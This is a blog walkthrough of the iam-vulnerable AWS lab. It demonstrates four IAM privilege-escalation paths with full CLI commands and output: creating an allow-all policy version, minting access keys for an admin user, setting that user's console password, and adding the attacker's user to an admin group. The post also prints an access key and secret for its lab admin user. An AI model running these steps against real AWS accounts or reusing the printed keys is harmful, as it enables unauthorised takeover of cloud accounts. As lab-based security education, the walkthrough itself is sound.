---
title: "IAM Vulnerable Walkthrough"
date: 2024-02-17
categories: [AWS, Cloud, Security]
tags: [AWS, Security, IAM, Privilege Esclation]
---

Hey readers! Hope you all are having an amazing day. IAM Privilege Esclatation is an interesting topic, I learned about this first time when I was doing a course and labs from [Attack Defense](https://attackdefense.pentesteracademy.com/listingnoauth?labtype=cloud-services&subtype=cloud-services-amazon-iam). I also read some interesting blogs on IAM Privilege Esclation from [RhinoSecurity](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/), another research from [BishopFox](https://bishopfox.com/blog/privilege-escalation-in-aws) and, [this blog post from Hackingthe.cloud](https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/).\
I have also tried different tools such as [aws esclatate](https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws_escalate.py), [Pacu](https://github.com/RhinoSecurityLabs/pacu), and [Cloudsplaining](https://github.com/salesforce/cloudsplaining).

I was planning to solve [iam vulnerable](https://github.com/BishopFox/iam-vulnerable) for quite some time now, and finally we will start it today. Using this tool, we can setup our own lab environment to test misconfigured/vulnerable user, roles, groups and policies created by this tool and play around exploring different IAM privilege esclatation paths.

Steps to setup and configure are mentioned in the [Readme of the tool](https://github.com/BishopFox/iam-vulnerable) or [here](https://bishopfox.com/blog/aws-iam-privilege-escalation-playground), follow them and spin up your lab environment so we can jump into the interesting part. 

## Path 1 : CreateNewPolicyVersion

`User : privesc1-CreateNewPolicyVersion-user`

Let's list the policies attached to this user with the following command.

```
❯ aws iam list-attached-user-policies --user privesc1-CreateNewPolicyVersion-user --profile ayush
{
    "AttachedPolicies": [
{
        {
            "PolicyName": "privesc1-CreateNewPolicyVersion",
            "PolicyArn": "arn:aws:iam::9[REDACTED]2:policy/privesc1-CreateNewPolicyVersion"
        }
    ]
}
```

Notice that we got the `PolicyArn` in the response, we can now retrieve the policy using the ARN.

```
❯ aws iam get-policy --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc1-CreateNewPolicyVersion --profile ayush
{
    "Policy": {
        "PolicyName": "privesc1-CreateNewPolicyVersion",
        "PolicyId": "ANPA6CT7N4R3FCWLXUGFQ",
        "Arn": "arn:aws:iam::9[REDACTED]2:policy/privesc1-CreateNewPolicyVersion",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 2,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Allows privesc via iam:CreatePolicyVersion",
        "CreateDate": "2024-01-21T19:26:56+00:00",
        "UpdateDate": "2024-01-21T19:26:56+00:00",
        "Tags": []
    }
}
```

Observe the Description and `DefaultVersionId`, we can retrive the policy and check what permission it assigns to the user using the versionId of the policy.\
As you can observe, the policy allows the user to `CreatePolicyVersion` on any (*) resource. Here, a user can create a new policy with elevated privileges and assign it to themselves to escalate the privileges.  

```
❯ aws iam get-policy-version --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc1-CreateNewPolicyVersion --version-id v1 --profile ayush
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "iam:CreatePolicyVersion",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2024-01-21T19:26:56+00:00"
    }
}
```

We will create a policy which gives access to everything in our environment, basically Admin level privileges.

```
❯ vim allow_all.json

❯ cat allow_all.json
{
   "Version": "2012-10-17",
   "Statement": [
       {
           "Sid": "AllowEverything",
           "Effect": "Allow",
           "Action": "*",
           "Resource": "*"
       }
    ]
 }
```

And, we will create a new policy version and set it as the default version. 

```
❯ aws iam create-policy-version --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc1-CreateNewPolicyVersion --policy-document file://./allow_all.json --set-as-default --profile privesc1
{
    "PolicyVersion": {
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2024-02-15T12:25:14+00:00"
    }
}
```

If you will view the policy version `v1` again, you will observe `IsDefaultVersion` is set to `false`.

```
❯ aws iam get-policy-version --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc1-CreateNewPolicyVersion --version-id v1 --profile ayush
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "iam:CreatePolicyVersion",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2024-01-21T19:26:56+00:00"
    }
}
```

Fetch the latest version `v2` that we just created and set as default version, and you can observe the the policy permits All Actions on All the resources. Also, observe the `IsDefaultVersion` is set to `true.` 

```
❯ aws iam get-policy-version --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc1-CreateNewPolicyVersion --version-id v2 --profile ayush
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "AllowEverything",
                    "Effect": "Allow",
                    "Action": "*",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2024-02-15T12:25:14+00:00"
    }
}
```

Here, we successfully elevated our privileges to now have equal access as an Admin, by exploiting `CreatePolicyVersion` permission.

## Path 2 - CreateAccessKey

`User : privesc4-CreateAccessKey-user`

Let's first collect the basic information about the user.

```
❯ aws iam get-user --user privesc4-CreateAccessKey-user
{
    "User": {
        "Path": "/",
        "UserName": "privesc4-CreateAccessKey-user",
        "UserId": "AIDA6CT7N4R3DDW5TZT6O",
        "Arn": "arn:aws:iam::9[REDACTED]2:user/privesc4-CreateAccessKey-user",
        "CreateDate": "2024-01-21T19:26:51+00:00"
    }
}
```

Let's list the policies attached to this user with the following command.

```
❯ aws iam list-attached-user-policies --user privesc4-CreateAccessKey-user
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc4-CreateAccessKey",
            "PolicyArn": "arn:aws:iam::9[REDACTED]2:policy/privesc4-CreateAccessKey"
        }
    ]
}
```

Notice that we got the `PolicyArn` in the response, we can now retrieve the policy using the ARN.

```
❯ aws iam get-policy --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc4-CreateAccessKey
{
    "Policy": {
        "PolicyName": "privesc4-CreateAccessKey",
        "PolicyId": "ANPA6CT7N4R3IRKOWQEQF",
        "Arn": "arn:aws:iam::9[REDACTED]2:policy/privesc4-CreateAccessKey",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 2,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Allows privesc via iam:CreateAccessKey",
        "CreateDate": "2024-01-21T19:26:51+00:00",
        "UpdateDate": "2024-01-21T19:26:51+00:00",
        "Tags": []
    }
}
```

Observe the Description and `DefaultVersionId`, we can retrive the policy and check what permission it assigns to the user using the versionId of the policy.\
The Policy allows `CreateAccessKey` action on any(*) resource. Which means we can create access keys for a higher privileges user and use those keys to perform higher privileged actions.

```
❯ aws iam get-policy-version --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc4-CreateAccessKey --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "iam:CreateAccessKey",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2024-01-21T19:26:51+00:00"
    }
}
```

Let's first collect the basic information about the `adminUser`. We can notice there exists an admin user, we can try to create an access key for the admin user and if we are successfull, we can use that access key to elevate our privileges.

```
❯ aws iam get-user --user adminUser
{
    "User": {
        "Path": "/",
        "UserName": "adminUser",
        "UserId": "AIDA6CT7N4R3E74G2AE72",
        "Arn": "arn:aws:iam::9[REDACTED]2:user/adminUser",
        "CreateDate": "2024-02-16T06:55:00+00:00"
    }
}
```

Now, we will simply create access keys for the admin user. Once the command is successful, we can configure those keys we just created of an admin user in our environment and we can now perform actions as per admin user.

```
❯ aws iam create-access-key --user-name adminUser --profile privesc4
{
    "AccessKey": {
        "UserName": "adminUser",
        "AccessKeyId": "AKIA6CT7N4R3HTU5HCUJ",
        "Status": "Active",
        "SecretAccessKey": "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",
        "CreateDate": "2024-02-16T07:03:04+00:00"
    }
}

❯ aws configure --profile adminUser
AWS Access Key ID [None]: AKIA6CT7N4R3HTU5HCUJ
AWS Secret Access Key [None]: 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
Default region name [None]:
Default output format [None]:

❯ aws sts get-caller-identity --profile adminUser
{
    "UserId": "AIDA6CT7N4R3E74G2AE72",
    "Account": "9[REDACTED]2",
    "Arn": "arn:aws:iam::9[REDACTED]2:user/adminUser"
}
```

## Path 3 - CreateLoginProfile

`User : privesc5-CreateLoginProfile-user`

Let's first collect the basic information about the user.

```
❯ aws iam get-user --user privesc5-CreateLoginProfile-user
{
    "User": {
        "Path": "/",
        "UserName": "privesc5-CreateLoginProfile-user",
        "UserId": "AIDA6CT7N4R3DCC7T2AFT",
        "Arn": "arn:aws:iam::9[REDACTED]2:user/privesc5-CreateLoginProfile-user",
        "CreateDate": "2024-01-21T19:26:51+00:00"
    }
}
```

Let's now list the policies attached to this user with the following command.

```
❯ aws iam list-attached-user-policies --user privesc5-CreateLoginProfile-user
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc5-CreateLoginProfile",
            "PolicyArn": "arn:aws:iam::9[REDACTED]2:policy/privesc5-CreateLoginProfile"
        }
    ]
}
```

Notice that we got the `PolicyArn` in the response, we can now retrieve the policy using the ARN.

```
❯ aws iam get-policy --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc5-CreateLoginProfile
{
    "Policy": {
        "PolicyName": "privesc5-CreateLoginProfile",
        "PolicyId": "ANPA6CT7N4R3DRJMGQPJV",
        "Arn": "arn:aws:iam::9[REDACTED]2:policy/privesc5-CreateLoginProfile",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 2,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Allows privesc via iam:CreateLoginProfile",
        "CreateDate": "2024-01-21T19:26:54+00:00",
        "UpdateDate": "2024-01-21T19:26:54+00:00",
        "Tags": []
    }
}
```
Observe the Description and `DefaultVersionId`, we can retrive the policy and check what permission it assigns to the user using the versionId of the policy.\
The policy let's user `CreateLoginProfile` on any (*) resource.

```
❯ aws iam get-policy-version --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc5-CreateLoginProfile --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "iam:CreateLoginProfile",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2024-01-21T19:26:54+00:00"
    }
}
```

We can create login profile of a high privilege user which does not have Console login enabled. For this task, I created `adminUser` without console login. So we can create a console login profile of `adminUser`.  

```
❯ aws iam create-login-profile --user-name adminUser --password Password@1337! --no-password-reset-required --profile privesc5
{
    "LoginProfile": {
        "UserName": "adminUser",
        "CreateDate": "2024-02-16T07:34:05+00:00",
        "PasswordResetRequired": false
    }
}
```
Now, use the password you just set in the above step to login to the AWS Console.

![Intro](/images/iam-vulnerable/loginprofile1.png)

Observe that we were able to successfully login as an admin user.

![Intro](/images/iam-vulnerable/loginprofile2.png)

## IAM-AddUserToGroup

`User : privesc13-AddUserToGroup-user`

Let's first collect the basic information about the user.

```
❯ aws iam get-user --user privesc13-AddUserToGroup-user
{
    "User": {
        "Path": "/",
        "UserName": "privesc13-AddUserToGroup-user",
        "UserId": "AIDA6CT7N4R3CR4HUHRR3",
        "Arn": "arn:aws:iam::9[REDACTED]2:user/privesc13-AddUserToGroup-user",
        "CreateDate": "2024-01-21T19:26:55+00:00"
    }
}
```

Let's now list the policies attached to this user with the following command.

```
❯ aws iam list-attached-user-policies --user privesc13-AddUserToGroup-user
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc13-AddUserToGroup",
            "PolicyArn": "arn:aws:iam::9[REDACTED]2:policy/privesc13-AddUserToGroup"
        }
    ]
}
```
Notice that we got the `PolicyArn` in the response, we can now retrieve the policy using the ARN.

```
❯ aws iam get-policy --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc13-AddUserToGroup
{
    "Policy": {
        "PolicyName": "privesc13-AddUserToGroup",
        "PolicyId": "ANPA6CT7N4R3LZAE5H3CN",
        "Arn": "arn:aws:iam::9[REDACTED]2:policy/privesc13-AddUserToGroup",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 2,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Allows privesc via iam:AddUserToGroup",
        "CreateDate": "2024-01-21T19:26:57+00:00",
        "UpdateDate": "2024-01-21T19:26:57+00:00",
        "Tags": []
    }
}
```

Observe the Description and `DefaultVersionId`, we can retrive the policy and check what permission it assigns to the user using the versionId of the policy.\
This policy allows user to `AddUserToGroup`, basically user can add any user to any group.  

```
❯ aws iam get-policy-version --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc13-AddUserToGroup --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "iam:AddUserToGroup",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2024-01-21T19:26:57+00:00"
    }
}
```

We can exploit this permission by adding our own user to a group which has higher level of permissions assigned to it. We will first list the groups available.

```
❯ aws iam list-groups
{
    "Groups": [
        {
            "Path": "/",
            "GroupName": "privesc-sre-group",
            "GroupId": "AGPA6CT7N4R3IRZOB5AYV",
            "Arn": "arn:aws:iam::9[REDACTED]2:group/privesc-sre-group",
            "CreateDate": "2024-01-21T19:26:52+00:00"
        },
        {
            "Path": "/",
            "GroupName": "privesc11-PutGroupPolicy-group",
            "GroupId": "AGPA6CT7N4R3AWFI53WKK",
            "Arn": "arn:aws:iam::9[REDACTED]2:group/privesc11-PutGroupPolicy-group",
            "CreateDate": "2024-01-21T19:26:58+00:00"
        },
        {
            "Path": "/",
            "GroupName": "privesc8-AttachGroupPolicy-group",
            "GroupId": "AGPA6CT7N4R3ALEALDX3J",
            "Arn": "arn:aws:iam::9[REDACTED]2:group/privesc8-AttachGroupPolicy-group",
            "CreateDate": "2024-01-21T19:26:54+00:00"
        }
    ]
}

```

We can then list the policies attached to the group.

```
❯ aws iam list-attached-group-policies --group privesc-sre-group
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc-sre-admin-policy",
            "PolicyArn": "arn:aws:iam::9[REDACTED]2:policy/privesc-sre-admin-policy"
        }
    ]
}
```

Observe the`DefaultVersionId`, we can retrive the group policy and check what permission it assigns to the group using the versionId of the policy.\
As observed, it allows all actions of IAM, EC2 and S3 service on all resources to the users that belongs to the group `privesc-sre-admin-policy`. This is a higher level privilege than what we currently have, which is `AddUserToGroup`.

```
❯ aws iam get-policy-version --policy-arn arn:aws:iam::9[REDACTED]2:policy/privesc-sre-admin-policy --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:*",
                        "ec2:*",
                        "s3:*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2024-01-21T19:26:55+00:00"
    }
}
```

So, we will add ourself to this group with priviledged permissions. And that's how we are able to escalate our privileges by exploiting `AddUserToGroup` permission. 

```
❯ aws iam add-user-to-group --group-name privesc-sre-group --user-name privesc13-AddUserToGroup-user --profile privesc13

❯ aws iam list-groups-for-user --user-name privesc13-AddUserToGroup-user
{
    "Groups": [
        {
            "Path": "/",
            "GroupName": "privesc-sre-group",
            "GroupId": "AGPA6CT7N4R3IRZOB5AYV",
            "Arn": "arn:aws:iam::9[REDACTED]2:group/privesc-sre-group",
            "CreateDate": "2024-01-21T19:26:52+00:00"
        }
    ]
}
```